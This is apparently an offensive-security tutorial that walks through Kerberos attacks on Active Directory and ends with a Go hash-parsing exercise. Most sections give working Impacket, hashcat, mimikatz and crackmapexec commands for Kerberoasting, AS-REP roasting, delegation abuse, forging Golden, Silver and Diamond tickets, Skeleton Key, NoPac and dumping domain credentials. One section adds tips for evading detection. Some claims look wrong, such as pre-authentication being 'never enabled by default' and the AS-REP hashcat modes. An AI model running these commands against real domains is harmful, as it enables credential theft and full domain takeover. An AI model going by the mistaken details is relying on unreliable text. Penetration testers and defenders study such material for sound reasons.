Kerberos Attacks

Kerberos protocol exploitation, from Kerberoasting and delegation abuse to forged tickets and PAC attacks.

Overview

Kerberos is the ticket-based authentication protocol of Active Directory. Every ticket is encrypted with a key derived from an account password, so an attacker who can request, capture, or forge a ticket can impersonate its owner. This article follows the protocol message flow, maps each attack to the key it abuses, and shows the Impacket tooling that performs it.

The Kerberos Protocol

Kerberos is a ticket-based authentication protocol, not a challenge-response protocol. Understanding the exact message flow is the difference between knowing what a tool does and understanding why the attack works. 

Phase 1 - Authentication Service Exchange (AS-REQ / AS-REP):
  Client -> KDC:  AS-REQ (username, timestamp encrypted with user's password hash)
  KDC -> Client:   AS-REP (TGT encrypted with krbtgt hash, logon session key)
  [The TGT is opaque to the client. Only the KDC can decrypt it.]

Phase 2 - Ticket-Granting Service Exchange (TGS-REQ / TGS-REP):
  Client -> KDC:   TGS-REQ (TGT, authenticator, target SPN)
  KDC -> Client:   TGS-REP (service ticket encrypted with target's key, service session key)
  [The service ticket is opaque to the client. Only the service can decrypt it.]

Phase 3 - Client/Server Authentication Exchange (AP-REQ):
  Client -> Svc:   AP-REQ (service ticket, authenticator)
  Svc -> Client:   AP-REP (optional mutual authentication, timestamp from authenticator)

To steal credentials, exploit trust delegation, or forge tickets,
you need to understand which key encrypts which ticket.

Encryption types and their keys:

etype Name Key Derived From Hashcat Mode
23 RC4-HMAC NT hash of the password 13100 (TGS), 18200 (AS-REP)
17 AES128-CTS-HMAC-SHA1-96 Salted password (PBKDF2) 19600 (TGS)
18 AES256-CTS-HMAC-SHA1-96 Salted password (PBKDF2) 19700 (TGS)
1 DES-CBC-CRC Password Trivial (disabled by default since Windows 7/2008R2)

RC4- HMAC (etype 23) uses the NT hash as the symmetric key - this is the core vulnerability. If you know the NT hash of a service account (from Kerberoasting, DC Sync, or NTDS.dit extraction), you can decrypt that service account's tickets without cracking a password.

AES keys require the password to derive the key via PBKDF2 (4096 iterations of HMAC -SHA1). This is still crackable offline but significantly slower than RC4.

Kerberoasting

Kerberoasting exploits Phase 2 of Kerberos. When a client requests a TGS for an SPN , the K DC returns a service ticket encrypted with the service account's password-derived key. If that service account runs as a domain user (not a machine account or MSA), you can extract the encrypted portion and crack it offline.

Any authenticated domain user can request a TGS for any SPN . No special privileges required.

WHY it works : The K DC does not check whether the requesting user is authorized to access the service - it only checks that the user is authenticated and the SPN exists. The encrypted ticket is returned; authorization is checked by the service itself when the ticket is presented. But you never present the ticket to the service - you take the encrypted blob offline and crack it.

Enumeration and Attack with Impacket

# Step 1 - Enumerate all SPNs (requires any valid domain credentials)
GetUserSPNs.py -dc-ip 10.0.0.1 corp.local/jsmith:password

# Expected output:
# ServicePrincipalName              Name      MemberOf  PasswordLastSet      LastLogon Delegation
# --------------------------------  --------  --------  -------------------  --------- ----------
# MSSQLSvc/db01.corp.local:1433     svc_sql             2024-01-15 09:00:00  <never>
# HTTP/webserver.corp.local         svc_web   Domain Admins  2024-03-01 14:00:00  <never>
#
# The second entry - svc_web is a Domain Admin - is a GOLD MINE.
# Cracking that service password gives you Domain Admin access.
						
# Step 2 - Request TGS tickets for all SPNs and save hashes
GetUserSPNs.py -dc-ip 10.0.0.1 corp.local/jsmith:password -request -outputfile kerberoast-hashes.txt

# The output file format (one hash per line):
# $krb5tgs$23$*svc_sql$CORP.LOCAL$corp.local/svc_sql*$ab12cd34...rest_of_hash
# $krb5tgs$23$*svc_web$CORP.LOCAL$corp.local/svc_web*$ef56gh78...rest_of_hash
#
# Hashcat format:
#   $krb5tgs$etype$*user$realm$spn*$ciphertext
						
# Step 2 alternative - request a TGS for a single specific SPN
GetUserSPNs.py -dc-ip 10.0.0.1 corp.local/jsmith:password -request-user svc_sql
						
# Step 3 - Crack the hashes with hashcat
# RC4 (etype 23) - mode 13100 - FAST (100+ MH/s on a single GPU)
hashcat -m 13100 -a 0 kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt --force

# AES256 (etype 18) - mode 19700 - SLOW (~20 kH/s on a good GPU)
hashcat -m 19700 -a 0 kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt --force

# AES128 (etype 17) - mode 19600
hashcat -m 19600 -a 0 kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt --force

# If the ticket uses RC4 (the most common case), you are cracking the NT hash of the
# service password. If the service password matches a dictionary word + common mutations,
# you will crack it in seconds.
						
# Step 4 - Verify cracked credentials
crackmapexec smb 10.0.0.50 -u svc_sql -p 'CrackedPass123!' -d corp.local

# If the account has administrative access on any machine:
crackmapexec smb 10.0.0.50 -u svc_sql -p 'CrackedPass123!' -d corp.local -x 'whoami'

High-Value Kerberoasting Targets

Not all SPN s are equal. Prioritize:

Priority SPN Pattern / MemberOf Why
Critical SPN on an account that ismemberOf: Domain Admins The service runs as DA. Crack the service password -> DA access.
High SPN on an account that ismemberOf: Administratorsor hasAdminCount=1 The service runs as local admin on its host, possibly a DC.
High SPN on a user withuserAccountControl: TRUSTED_FOR_DELEGATION Unconstrained delegation account. Crack it -> steal TGTs from any user who authenticates to it.
Medium SPN on a service account withAdminCount=0but belongs to nested administrative groups (checked via BloodHound) Indirect path to DA.
Low SPN on a service account with no administrative memberships Limited lateral movement, but still useful as a foothold. 
# Identify high-value targets before requesting tickets
GetUserSPNs.py -dc-ip 10.0.0.1 corp.local/jsmith:password | \
    grep -iE 'admin|sql|svc|backup|web|exchange|sharepoint'

# Cross-reference with Domain Admins membership:
# In BloodHound: MATCH (u:User {hasspn: true})-[:MemberOf*1..]->(g:Group)
#               WHERE g.name CONTAINS 'ADMIN' RETURN u.name

Mitigation: What You Cannot Kerberoast

  • Managed Service Accounts (MSA/sMSA) : The password is a 240-character random string managed by AD. It rotates automatically every 30 days. You can request a TGS, but the hash is uncrackable with current hardware.
  • Group Managed Service Accounts (gMSA) : Same idea but for multiple servers. Password managed by AD, rotated automatically.
  • Computer accounts : Every computer has SPN s ( HOST/ , CIFS/ , TERMSRV/ , WSMAN/ , RestrictedKrbHost/ ). Machine account passwords are 120+ character random strings rotated every 30 days. Uncrackable.
  • Accounts with AES-only Kerberos : AES uses PBKDF2 with 4096 iterations - significantly slower to crack than RC4- HMAC , which uses a single NT hash. But not uncrackable - a weak password in AES is still crackable.
# Check if a service account uses MSA/gMSA
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(&(objectclass=user)(servicePrincipalName=*))" \
    samaccountname msDS-ManagedPasswordId msDS-GroupMSAMembership 2>/dev/null

# If msDS-ManagedPasswordId is populated -> sMSA
# If msDS-GroupMSAMembership is populated -> gMSA
# Neither = regular user account -> roast it

AS-REP Roasting

AS-REP roasting exploits Phase 1 of Kerberos. Normally, the AS-REQ includes a timestamp encrypted with the user's password hash (pre-authentication). This proves the user knows the password, and it prevents offline cracking of the AS-REP.

When a user has UF_DONT_REQUIRE_PREAUTH ( UAC flag 0x400000), the K DC skips this check and sends the AS-REP immediately. The AS-REP contains a TGT and an encrypted timestamp - both encrypted with keys derived from the user's password hash. Without pre-authentication, anyone can request an AS-REP for that user and crack it offline.

WHY it works : The K DC does not require proof that the requesting entity knows the password. The AS-REP is returned regardless. The encrypted timestamp inside is a known plaintext (Kerberos timestamp format is predictable), which strengthens the offline cracking attack. 

# Step 1 - Enumerate users with UF_DONT_REQUIRE_PREAUTH (requires credentials)
GetNPUsers.py -dc-ip 10.0.0.1 corp.local/jsmith:password -request -outputfile asrep-hashes.txt

# Expected output:
# [*] Getting TGT for user_with_preauth_disabled@corp.local
# $krb5asrep$23$user_with_preauth_disabled@CORP.LOCAL:ab12cd34...hash...
						
# Step 2 - Without credentials: test a username list for AS-REP roastable users
GetNPUsers.py -no-pass -dc-ip 10.0.0.1 corp.local/ -usersfile valid-users.txt

# The tool sends an AS-REQ for each username without pre-authentication.
# If the user is AS-REP roastable, the KDC returns the hash.
# If not, the KDC returns KDC_ERR_PREAUTH_REQUIRED (silent).
						
# Step 3 - Crack the AS-REP hashes
# Mode 18200 for etype 23 (RC4-HMAC)
hashcat -m 18200 -a 0 asrep-hashes.txt /usr/share/wordlists/rockyou.txt --force

# AS-REP cracking is comparable to Kerberoasting: both attack a key derived
# from the password. The known timestamp lets a cracker verify a guessed
# password quickly once the candidate plaintext has been computed.

Why Pre-Authentication Is Disabled

Several legitimate (and illegitimate) scenarios:

  1. Legacy application compatibility : Old Kerberos implementations (Java pre-1.6, MIT Kerberos pre-1.5) did not support pre-auth. AD administrators sometimes disable pre-auth to make these apps work.
  2. Linux/UNIX hosts joined with old versions of Samba/Winbind .
  3. Third-party LDAP/Kerberos integrations ( VPN concentrators, load balancers, SSO appliances) that had pre-auth bugs.
  4. Misconfiguration : Pre-auth is never enabled by default - it's a per-user flag. A new user created via a non-standard tool may have it disabled.
  5. Network device accounts : Printers, scanners, and IoT devices running embedded Kerberos stacks with broken pre-auth support.
# Use an LDAP query to find ALL users with UF_DONT_REQUIRE_PREAUTH
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(&(objectclass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
    cn samaccountname useraccountcontrol pwdlastset lastlogontimestamp \
    2>/dev/null | grep -v '^#'

# Flag 4194304 = 0x400000 = UF_DONT_REQUIRE_PREAUTH
# Accounts with very old pwdLastSet -> password unchanged for years -> likely easier to crack

Kerberos Delegation

Delegation allows a service to impersonate a user when accessing other services on their behalf. Three types exist in Active Directory, each with distinct abuse vectors.

Unconstrained Delegation

When a user authenticates to a service with unconstrained delegation, the service receives the user's TGT inside the forwarded TGS. The service can then use that TGT to request service tickets for ANY service as that user.

Attacker move: compromise a server with unconstrained delegation, wait for a high-privilege user to authenticate to it (or coerce a DC to authenticate via PetitPotam/PrinterBug), extract the TGT from LSASS memory, and use it. 

# Enumerate computers with unconstrained delegation via LDAP
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(&(objectclass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
    cn samaccountname dnshostname operatingsystem lastlogontimestamp \
    2>/dev/null | grep -v '^#'

# Flag 524288 = 0x80000 = TRUSTED_FOR_DELEGATION
						
# If you compromise a server with unconstrained delegation, dump tickets:
# (Requires SYSTEM on the compromised Windows host - use mimikatz)
# mimikatz # privilege::debug
# mimikatz # sekurlsa::tickets /export
# mimikatz # kerberos::list /export

# On the compromised host, if a Domain Admin has a session or authenticates
# to it (coerced via PetitPotam), their TGT will be in LSASS memory.
# Extract and reuse it:
# (On attacker Linux box)
# First, convert the .kirbi ticket to ccache:
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=$(pwd)/ticket.ccache
# Then use Impacket tools with the cached ticket:
psexec.py -k -no-pass corp.local/administrator@dc01.corp.local

Constrained Delegation (S4U2Proxy)

Constrained delegation restricts which services a server can impersonate users to. The msDS-AllowedToDelegateTo attribute lists the target SPN s. The server can use the S4U2self extension to request a service ticket for ANY user, then use S4U2proxy to forward that ticket to one of its allowed-to-delegate-to SPN s. 

# Enumerate constrained delegation
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(&(objectclass=user)(msDS-AllowedToDelegateTo=*))" \
    cn samaccountname msDS-AllowedToDelegateTo 2>/dev/null | grep -v '^#'

ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(&(objectclass=computer)(msDS-AllowedToDelegateTo=*))" \
    cn samaccountname msDS-AllowedToDelegateTo 2>/dev/null | grep -v '^#'

Abuse scenario : Compromise a server that has constrained delegation to a Domain Controller's CIFS or LDAP SPN . Use S4U2self to obtain a service ticket for a Domain Admin, then use S4U2proxy to present that ticket to the DC 's CIFS service - you now have Domain Admin-level SMB access to the DC . 

# Impacket's getST.py performs the constrained delegation attack
# from a Linux attacker, using the compromised service account's credentials
# or its NT hash/AES key.

# With password:
getST.py -spn cifs/dc01.corp.local -impersonate administrator \
    corp.local/svc_web:'password'

# With NT hash:
getST.py -spn cifs/dc01.corp.local -impersonate administrator \
    -hashes :ntlm_hash_here corp.local/svc_web

# The output is a ccache file containing the impersonated ticket:
export KRB5CCNAME=administrator.ccache
crackmapexec smb dc01.corp.local --use-kcache

Resource-Based Constrained Delegation

RBCD reverses the trust model. Instead of configuring which services a server can delegate TO, RBCD configures which principals can delegate TO a given resource. The attribute msDS-AllowedToActOnBehalfOfOtherIdentity is set on the TARGET, listing which source accounts can impersonate users to it.

Abuse requirement : GenericWrite , GenericAll , WriteProperty , or AddAllowedToAct on the target computer. 

# Step 1 - Create a computer account (any domain user can create up to 10 by default)
addcomputer.py -computer-name 'EVIL-MACHINE$' -computer-pass 'P@ssw0rd123!' \
    -dc-ip 10.0.0.1 corp.local/jsmith:password

# The MachineAccountQuota attribute defaults to 10 - any authenticated user
# can create up to 10 machine accounts. This is a design feature, not a bug.

# Step 2 - Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
# This grants our fake computer account the right to impersonate any user to TARGET-PC
rbcd.py -delegate-from 'EVIL-MACHINE$' -delegate-to 'TARGET-PC$' \
    -action write -dc-ip 10.0.0.1 corp.local/jsmith:password

# Step 3 - Use S4U2self to request a service ticket for Administrator
# Impersonate Administrator to the target computer
getST.py -spn cifs/TARGET-PC.corp.local -impersonate administrator \
    -dc-ip 10.0.0.1 'corp.local/EVIL-MACHINE$:P@ssw0rd123!'

# Step 4 - Use the ticket to access the target computer as Administrator
export KRB5CCNAME=administrator.ccache
crackmapexec smb TARGET-PC.corp.local --use-kcache
psexec.py -k -no-pass TARGET-PC.corp.local
secretsdump.py -k -no-pass TARGET-PC.corp.local

Golden Ticket

A Golden Ticket is a forged TGT signed with the krbtgt account's NT hash. Since every Kerberos ticket in the domain is ultimately validated against the krbtgt key, a TGT signed with krbtgt's hash is unconditionally trusted by every Domain Controller.

Requirements : krbtgt NT hash (or AES key), domain SID, domain FQDN .

Persistence property : The krbtgt key is not rotated automatically, so a forged TGT stays valid even after every user password is changed. To invalidate it, an administrator must reset the krbtgt account password twice, because AD keeps the previous key as a secondary key during an overlap period. 

# Step 1 - Obtain the krbtgt hash (requires Domain Admin or DCSync rights)
secretsdump.py -just-dc-user krbtgt corp.local/administrator:password@dc01.corp.local

# Expected output:
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ab12cd34ef56...64_hex_chars_nt_hash:::
#   ^^^                ^^^                             ^^^
#   account    empty LM hash (always)          NT hash (THE important part)

# Save the NT hash (rightmost part after the second colon).
						
# Step 2 - Obtain the domain SID
rpcclient -U "corp.local/jsmith%password" 10.0.0.1 -c "lsaquery"
# Domain Sid: S-1-5-21-1122334455-1122334455-1122334455

# Alternative via whoami on a compromised machine:
# whoami /user
# The part before the last dash is the domain SID.
						
# Step 3 - Forge the Golden Ticket with Impacket's ticketer.py
ticketer.py -nthash ab12cd34ef56...krbtgt_nt_hash \
    -domain-sid S-1-5-21-1122334455-1122334455-1122334455 \
    -domain corp.local \
    -user-id 500 \
    -groups 512,513,518,519,520,572 \
    Administrator

# -nthash : krbtgt NT hash
# -domain-sid : domain SID from lsaquery
# -domain : domain FQDN
# -user-id : RID for user (500 = built-in Administrator)
# -groups : comma-separated list of group RIDs to inject into the PAC
#   512 = Domain Admins
#   513 = Domain Users
#   518 = Schema Admins
#   519 = Enterprise Admins
#   520 = Group Policy Creator Owners
#   572 = Denied RODC Password Replication Group

# Output: Administrator.ccache - a Kerberos credential cache containing the forged TGT
						
# Step 4 - Use the Golden Ticket
export KRB5CCNAME=Administrator.ccache

# Verify the ticket works
crackmapexec smb dc01.corp.local --use-kcache

# Execute commands on the DC
psexec.py -k -no-pass dc01.corp.local
# Or for a less noisy shell:
wmiexec.py -k -no-pass dc01.corp.local

# Dump all credentials from the DC
secretsdump.py -k -no-pass dc01.corp.local
						
# Using AES keys instead of NT hash (more stealthy - fewer detection rules)
ticketer.py -aesKey 3a4b5c6d...64_hex_chars_aes256_key \
    -domain-sid S-1-5-21-1122334455-1122334455-1122334455 \
    -domain corp.local \
    Administrator

# AES keys are available from DCSync or NTDS.dit extraction,
# same as the NT hash. Secretsdump outputs both.

Detection and OpSec Notes

  • Golden Tickets generate Event ID 4768 (TGT request) and 4769 (TGS request). The ticket will have a blank/zeroed ServiceName field in the Windows event log - this is a detection opportunity for defenders.
  • The -duration and -start-offset flags in ticketer.py control TGT lifetime. Default is 10 years. Setting a realistic duration (10 hours, the default TGT lifetime) reduces detection surface.
  • Every psexec.py -k with a Golden Ticket creates a service on the target to execute code. Services are logged (Event 7045) and persist on disk. Prefer wmiexec.py -k which does not create a service.

Silver Ticket

A Silver Ticket is a forged service ticket signed with a service account's NT hash (not krbtgt's). It bypasses the K DC entirely - the service validates the ticket using its own key, and the K DC is never consulted for a Silver Ticket's authenticity.

Requirements : Service account's NT hash (or AES key), domain SID, domain FQDN , target SPN .

Scope : The Silver Ticket works only for the targeted service (e.g., CIFS or HOST for file access, LDAP for directory access, MSSQLSvc for SQL Server access). Unlike a Golden Ticket, it does not grant Kerberos TGT-based access to arbitrary services. 

# Step 1 - Extract the service account NT hash (via DCSync or NTDS.dit)
secretsdump.py -just-dc-user MACHINE-NAME\$ corp.local/administrator:password@dc01.corp.local

# A computer account hash works - you can forge CIFS/HOST/LDAP tickets for it.
# Obtain the computer account NTLM hash via:
secretsdump.py corp.local/jsmith:password@TARGET-PC.corp.local

# Step 2 - Forge the Silver Ticket
ticketer.py -nthash computer_nt_hash \
    -domain-sid S-1-5-21-1122334455-1122334455-1122334455 \
    -domain corp.local \
    -spn cifs/TARGET-PC.corp.local \
    Administrator

# -spn : the target service principal name. Common SPNs:
#   cifs/SERVER   -> SMB file access
#   host/SERVER   -> remote service management, scheduled tasks
#   ldap/SERVER   -> LDAP queries and modifications (DCSync!)
#   http/SERVER   -> HTTP/HTTPS services
#   mssqlsvc/SERVER  -> SQL Server (if running as the machine account)

# Step 3 - Use the Silver Ticket
export KRB5CCNAME=Administrator.ccache
crackmapexec smb TARGET-PC.corp.local --use-kcache
						
# Silver Ticket for LDAP - allows DCSync impersonation
ticketer.py -nthash dc_computer_nt_hash \
    -domain-sid S-1-5-21-1122334455-1122334455-1122334455 \
    -domain corp.local \
    -spn ldap/dc01.corp.local \
    Administrator

export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass dc01.corp.local

Diamond Ticket

A Diamond Ticket is a Golden Ticket with a valid PAC structure copied from a real TGT. Standard Golden Ticket forgery constructs a PAC from scratch, which can trigger PAC validation anomalies. A Diamond Ticket requests a legitimate TGT as a low-privileged user, decrypts it, copies the PAC, then re-encrypts it with the krbtgt hash - producing a ticket with a PAC that passes all integrity checks. 

# Diamond Ticket workflow with ticketer.py
# Step 1 - Request a legitimate TGT for a real user
getTGT.py -dc-ip 10.0.0.1 corp.local/jsmith:password
export KRB5CCNAME=jsmith.ccache

# Step 2 - Request a TGS-as-TGT to get a valid PAC structure
# (ticketer.py handles this via the -request flag)

# Step 3 - Forge with the -request flag, which:
#   1. Requests a TGT for the user specified with -user-id
#   2. Decrypts it with the krbtgt hash
#   3. Copies the PAC structure
#   4. Modifies the PAC (elevates group memberships)
#   5. Re-encrypts with krbtgt hash
ticketer.py -request \
    -nthash krbtgt_nt_hash \
    -domain-sid S-1-5-21-1122334455-1122334455-1122334455 \
    -domain corp.local \
    -user-id 500 \
    -groups 512,513,519 \
    Administrator

Skeleton Key

The Skeleton Key patches the LSASS process on a Domain Controller in memory to accept a master password for any user account. When enabled, any domain user can authenticate as any other domain user using the skeleton key password, while their real password continues to work.

This is an in-memory-only patch. It persists until the DC reboots. No files are modified, no registry keys are changed, no persistence mechanism exists through reboots. It is strictly a real-time post-exploitation technique. 

# On the compromised DC (Windows, requires SYSTEM + mimikatz):
# mimikatz # privilege::debug
# mimikatz # misc::skeleton
# [output showing the patch applied]

# Now from the attacker machine, authenticate as ANY user with password "mimikatz":
crackmapexec smb dc01.corp.local -u administrator -p mimikatz -d corp.local
psexec.py corp.local/administrator:mimikatz@dc01.corp.local

The Skeleton Key patches KerbVerifyCredentials() in LSASS . It intercepts the NTLM /Kerberos credential verification call and injects a secondary valid credential path - the master password "mimikatz" - alongside the legitimate credential check. Both paths work; the real password and the skeleton key password both authenticate successfully.

Overpass-the-Hash (Pass-the-Key)

Overpass-the-Hash uses an NTLM hash or AES key to request a Kerberos TGT directly from the K DC , without knowing the plaintext password. The K DC accepts the RC4- HMAC (NT hash) or AES key as the pre-authentication secret, encrypts the timestamp, and returns a valid TGT. From that point forward, all authentication is pure Kerberos - no NTLM challenge-response involved.

This is different from Pass-the-Hash (PtH), which uses the NTLM hash directly against SMB / NTLM -based services. Overpass-the-Hash obtains a Kerberos TGT - which enables access to Kerberos-only services and bypasses NTLM signing requirements. 

# Step 1 - Obtain an NTLM hash of a user
# (via mimikatz on Windows, secretsdump.py, DCSync, or NTDS.dit extraction)

# Step 2 - Request a TGT using the NT hash (RC4)
getTGT.py -dc-ip 10.0.0.1 -hashes :ntlm_hash_here corp.local/jsmith

# -hashes :LMHASH:NTHASH  -> the LM hash can be aad3b435... (empty) or left blank
#   Format: :NTHASH  (colon before hash, LM empty)

# Alternative - use AES key instead of NT hash (more stealthy, TGT uses AES encryption)
getTGT.py -dc-ip 10.0.0.1 -aesKey aes256_key_here corp.local/jsmith

# Step 3 - Use the obtained TGT
export KRB5CCNAME=jsmith.ccache

Pass-the-Ticket

Pass-the-Ticket uses a stolen Kerberos ticket (TGT or TGS) to authenticate as the ticket's user. Tickets are stored in LSASS memory on Windows hosts and in credential cache files (ccache) on Linux/macOS hosts connected to the domain.

Ticket lifetime: TGT default lifetime is 10 hours, renewable for up to 7 days. TGS lifetime is 10 hours (or the remaining TGT lifetime, whichever is shorter). After expiration, the ticket is useless without renewal. 

# Extract tickets from a compromised Linux host with an active Kerberos session
ls -la /tmp/krb5cc_*        # Default ccache location
export KRB5CCNAME=/tmp/krb5cc_1000
klist                         # List tickets in the cache

# Copy another user's ccache file (root required if permissions restricted)
cp /tmp/krb5cc_1001 /tmp/stolen.ccache
chmod 600 /tmp/stolen.ccache
export KRB5CCNAME=/tmp/stolen.ccache
klist
						
# Extract tickets from a compromised Windows host using Impacket's export
# On the compromised Windows host with mimikatz:
# mimikatz # sekurlsa::tickets /export

# This exports .kirbi files to the current directory.
# Convert .kirbi to ccache for use with Impacket tools:
ticketConverter.py user_ticket.kirbi user_ticket.ccache
export KRB5CCNAME=user_ticket.ccache

# Use the ticket
psexec.py -k -no-pass dc01.corp.local
						
# Extract tickets from a Windows LSASS dump with pypykatz
# First, dump LSASS on the compromised host:
# (Windows, admin): rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> dump.dmp full

Ticket Lifetime and Renewal

# Check ticket lifetime
klist

# Output:
# Ticket cache: FILE:/tmp/krb5cc_1000
# Default principal: jsmith@CORP.LOCAL
#
# Valid starting     Expires            Service principal
# 01/15/24 09:00:00  01/15/24 19:00:00  krbtgt/CORP.LOCAL@CORP.LOCAL
#     renew until 01/22/24 09:00:00

# Renew a ticket before it expires
kinit -R

# If the TGT is still within its renewable window (up to 7 days), kinit -R
# extends the validity without re-authentication. After the renewable window
# expires, a new AS-REQ with the password/hash is required.

PAC Abuse and NoPac

NoPac combines two vulnerabilities:

  1. CVE-2021-42278 : AD did not validate that a computer account's sAMAccountName ends in $ . An attacker who controls a machine account could rename it to match a DC account name, minus the trailing $ .
  1. CVE-2021-42287 : When the K DC cannot find an account by name during a TGS request, it appends $ and retries the lookup. If the attacker's renamed machine account has already been renamed back, the fallback lands on the Domain Controller's own machine account.

Combined attack: Create a machine account, rename it to a DC name without the $ , request a TGT, then rename it back. When you use that TGT to request a service ticket, the K DC cannot find the name, appends $ , and issues a ticket with the Domain Controller's privileges. 

# NoPac attack with Impacket tools
# Step 1 - Create a computer account
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ssw0rd123!' \
    -dc-ip 10.0.0.1 corp.local/jsmith:password

# Step 2 - Clear the computer account SPNs (nopac.py does this automatically)
# System administrators use this script:
nopac.py -dc-ip 10.0.0.1 corp.local/jsmith:password \
    -use-ldap -shell

# Or the complete automated attack:
nopac.py -dc-ip 10.0.0.1 corp.local/jsmith:password \
    -impersonate administrator -dump

# nopac.py handles:
#   1. Create a computer account (or use provided one)
#   2. Clear its SPNs (servicePrincipalName)
#   3. Rename the computer to target username (e.g., Administrator)
#   4. Request TGT for the renamed computer
#   5. Extract the PAC -> contains target's SID with computer's name
#   6. Rename computer back, request service ticket via S4U2self
#   7. Dump secrets (or execute a command) using the obtained ticket
						
# Manual detection of the NoPac prerequisite configuration:
# Check if MachineAccountQuota allows computer creation
crackmapexec smb 10.0.0.1 -u jsmith -p password -d corp.local -M maq

# Output: MAQ = 10  -> default, allows up to 10 computers per non-admin user
# Output: MAQ = 0   -> hardened, attack blocked at step 1

Verification and Common Mistakes

Kerberoasting - wrong hashcat mode. The hash format line $krb5tgs$23$... tells you the etype. 23 = RC4 -> mode 13100. 18 = AES 256 -> mode 19700. 17 = AES 128 -> mode 19600. Using the wrong mode produces no cracked output even with the correct password.

Golden Ticket - forgetting to populate the domain SID and group RIDs. A Golden Ticket with an incorrect domain SID is rejected. A Golden Ticket without group RID 512 (Domain Admins) grants no administrative access.

Silver Ticket against CIFS - wrong SPN. The SPN must be the service's registered SPN , not the hostname. cifs/dc01.corp.local , not smb/dc01.corp.local , not dc01.corp.local .

Pass-the-Ticket - ccache file permissions. The KRB5CCNAME file must be owned by the user running the Impacket tools and must not have o+rw permissions (Kerberos libraries enforce mode 600 or 400). 

# Fix ccache permissions before use
chmod 600 /path/to/ticket.ccache

AS-REP roasting - Kerberos pre-auth returns KDC_ERR_PREAUTH_REQUIRED for most users. This is normal. GetNPUsers.py reports [!] KDC_ERR_PREAUTH_REQUIRED for users that require pre-auth. Only users with UAC flag 4194304 return a hash. Do not be discouraged by the errors - they are expected for 99% of users.

DNS Resolution. Impacket tools resolve hostnames. If your attacker machine cannot resolve dc01.corp.local , specify the IP with -dc-ip and the hostname with -target-ip where available. For Kerberos specifically, the SPN in the ticket must match the DNS name the target server uses - mismatches will cause KDC_ERR_S_PRINCIPAL_UNKNOWN . 

# Add entries to /etc/hosts for the engagement duration
echo "10.0.0.1 dc01.corp.local corp.local" | sudo tee -a /etc/hosts
echo "10.0.0.50 sql01.corp.local" | sudo tee -a /etc/hosts
echo "10.0.0.51 web01.corp.local" | sudo tee -a /etc/hosts

Challenge

Write a Go tool that parses the hash dumps produced by the attacks above. Read a file with one $krb5tgs$ or $krb5asrep$ hash per line, extract the encryption type and the account or SPN , and print the matching hashcat mode. The mode is 13100 for etype 23 TGS, 19700 for etype 18, and 19600 for etype 17; AS-REP hashes use 18200, 19700, and 19600. 

package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
)

func modeFor(kind string, etype string) string {
	switch kind + ":" + etype {
	case "krb5tgs:23":
		return "13100 (TGS RC4-HMAC)"
	case "krb5tgs:17":
		return "19600 (TGS AES128)"
	case "krb5tgs:18":
		return "19700 (TGS AES256)"
	case "krb5asrep:23":
		return "18200 (AS-REP RC4-HMAC)"
	default:
		return "unknown"
	}
}

func parse(line string) (kind, etype, principal string) {
	fields := strings.Split(line, "$")
	if len(fields) < 4 {
		return "", "", ""
	}
	kind = fields[1]
	etype = fields[2]
	if kind == "krb5tgs" && len(fields) > 5 {
		principal = strings.Trim(fields[3], "*") + "@" + strings.Trim(fields[4], "*")
	} else if kind == "krb5asrep" {
		principal = strings.Split(fields[3], ":")[0]
	}
	return kind, etype, principal
}

func main() {
	file, err := os.Open(os.Args[1])
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		kind, etype, principal := parse(line)
		if kind == "" {
			continue
		}
		fmt.Printf("%-24s etype %s  hashcat -m %s\n", principal, etype, modeFor(kind, etype))
	}
}

Build it and run it against kerberoast-hashes.txt or asrep-hashes.txt . Confirm the mode it prints matches the -m value you would pass to hashcat.
